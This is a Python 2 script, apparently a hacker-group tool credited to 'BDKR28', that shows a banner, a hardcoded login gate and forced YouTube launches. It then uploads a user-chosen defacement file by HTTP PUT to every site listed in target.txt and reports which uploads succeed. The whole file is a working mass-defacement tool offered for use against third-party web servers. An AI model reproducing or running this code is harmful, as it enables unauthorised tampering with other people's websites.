#-*- coding: utf-8 -*-
 
try:
   import requests
   import os.path
   import sys
except ImportError:
   exit("install requests and try again ...")
os.system ('clear')
print """

\033[1;91m ██████╗░██████╗░██╗░░██╗██████╗░██████╗░░█████╗░
\033[1;91m ██╔══██╗██╔══██╗██║░██╔╝██╔══██╗╚════██╗██╔══██╗
\033[1;91m ██████╦╝██║░░██║█████═╝░██████╔╝░░███╔═╝╚█████╔╝
\033[1;97m ██╔══██╗██║░░██║██╔═██╗░██╔══██╗██╔══╝░░██╔══██╗
\033[1;97m ██████╦╝██████╔╝██║░╚██╗██║░░██║███████╗╚█████╔╝
\033[1;97m ╚═════╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚══════╝░╚════╝░   
                                                                               
"""
banner = """

\033[1;92m                                                                      
    ,---,                                                             
  .'  .' `\              .--.,                                        
,---.'     \           ,--.'  \                                       
|   |  .`\  |          |  | /\/                                       
:   : |  '  |   ,---.  :  : :    ,--.--.     ,---.     ,---.          
|   ' '  ;  :  /     \ :  | |-, /       \   /     \   /     \         
'   | ;  .  | /    /  ||  : :/|.--.  .-. | /    / '  /    /  |        
|   | :  |  '.    ' / ||  |  .' \__\/: . ..    ' /  .    ' / |        
'   : | /  ; '   ;   /|'  : '   ," .--.; |'   ; :__ '   ;   /|        
|   | '` ,/  '   |  / ||  | |  /  /  ,.  |'   | '.'|'   |  / |        
;   :  .'    |   :    ||  : \ ;  :   .'   \   :    :|   :    |        
|   ,.'       \   \  / |  |,' |  ,     .-./\   \  /  \   \  /         
'---'          `----'  `--'    `--`---'     `----'    `----'          
 
\033[1;91m  			Author: BDKR28
\033[1;91m  			Youtube: BDKR-28
\033[1;91m  			Telegram: bdkr2
\033[1;97m  
                         """     

CorrectUsername = "BDKR28"
CorrectPassword = "user_deface"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;91m++ \x1b[1;91mTool Username \x1b[1;91m🙨 \x1b[1;92m")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;91m++ \x1b[1;91mTool Password \x1b[1;91m🙨 \x1b[1;92m")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:BDKR28_SANA_FAROOQ
            os.system('xdg-open https://www.youtube.com/channel/UCvLyz94122sn94uZNXsUW6g')
	 
            loop = 'false'
        else:
            print "\033[1;93mWrong Password"
            os.system('xdg-open https://www.youtube.com/channel/UCvLyz94122sn94uZNXsUW6g')
    else:
        print "\033[1;94mWrong Username"
        os.system('xdg-open https://www.youtube.com/channel/UCvLyz94122sn94uZNXsUW6g')
        
os.system ('clear')                               

b = '\033[31m'
h = '\033[32m'
m = '\033[00m'

def x(tetew):
   ipt = ''
   if sys.version_info.major > 2:
      ipt = input(tetew)
   else:
      ipt = raw_input(tetew)
   
   return str(ipt)

def aox(script,target_file="target.txt"):
   op = open(script,"r").read()
   with open(target_file, "r") as target:
      target = target.readlines()
      s = requests.Session()
      print("uploading file to %d website"%(len(target)))
      for web in target:
         try:
            site = web.strip()
            if site.startswith("http://") is False:
               site = "http://" + site
            req = s.put(site+"/"+script,data=op)
            if req.status_code < 200 or req.status_code >= 250:
               print(m+"["+b+" FAILED!"+m+" ] %s/%s"%(site,script))
            else:
               print(m+"["+h+" SUCCESS"+m+" ] %s/%s"%(site,script))

         except requests.exceptions.RequestException:
            continue
         except KeyboardInterrupt:
            print; exit()

def main(__bn__):
   print(__bn__)
   while True:
      try:
         a = x("Enter your script deface name: ")
         if not os.path.isfile(a):
            print("file '%s' not found"%(a))
            continue
         else:
            break
      except KeyboardInterrupt:
         print; exit()

   aox(a)
   
if __name__ == "__main__":
    main(banner)


